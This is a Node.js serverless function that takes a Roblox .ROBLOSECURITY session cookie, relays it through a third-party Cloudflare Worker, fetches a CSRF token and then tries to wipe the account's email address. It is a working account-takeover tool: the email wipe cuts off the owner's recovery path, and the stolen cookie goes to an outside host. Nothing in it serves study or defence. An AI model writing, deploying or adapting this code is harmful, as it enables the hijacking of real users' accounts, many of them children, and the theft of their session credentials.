const axios = require('axios');

module.exports = async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    const { cookie } = req.body;
    if (!cookie) return res.status(400).json({ success: false, message: 'Cookie is required.' });

    const cleanCookie = cookie.replace(/[^a-zA-Z0-9_\-|:.]/g, '');
    
    // YOUR CLOUDFLARE WORKER URL
    const workerUrl = 'https://cryptyxb.musetycherl.workers.dev'; 

    const baseHeaders = {
        'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    };

    // Helper function to route requests through the Cloudflare Worker
    async function workerRequest(targetUrl, method = 'GET', body = null) {
        const headers = { ...baseHeaders, 'X-Destination-URL': targetUrl };
        return axios({
            method: method,
            url: workerUrl,
            headers: headers,
            data: body ? JSON.stringify(body) : null,
            timeout: 8000
        });
    }

    try {
        // 1. Verify Cookie
        const authCheck = await workerRequest('https://users.roblox.com/v1/users/authenticated');
        if (authCheck.status !== 200) {
            return res.status(401).json({ success: false, message: 'Cookie is invalid or expired.' });
        }

        // 2. Get CSRF Token
        let csrfToken = '';
        try {
            await workerRequest('https://auth.roblox.com/v2/logout', 'POST');
        } catch (err) {
            if (err.response && err.response.headers['x-csrf-token']) {
                csrfToken = err.response.headers['x-csrf-token'];
                baseHeaders['X-CSRF-TOKEN'] = csrfToken;
            } else {
                return res.status(400).json({ success: false, message: 'Failed to grab CSRF token.' });
            }
        }

        // 3. Wipe Email
        try {
            await workerRequest('https://accountsettings.roblox.com/v1/email', 'POST', { emailAddress: "" });
            return res.status(200).json({ success: true, data: { messages: ["Email successfully wiped."] } });
        } catch (err) {
            if (err.response && err.response.status === 403) {
                return res.status(403).json({ success: false, message: "Blocked: Roblox requires the account password to remove the email." });
            }
            return res.status(500).json({ success: false, message: `Wipe failed: Status ${err.response ? err.response.status : err.message}` });
        }

    } catch (error) {
        res.status(500).json({ success: false, message: `Network Error: ${error.message}` });
    }
}
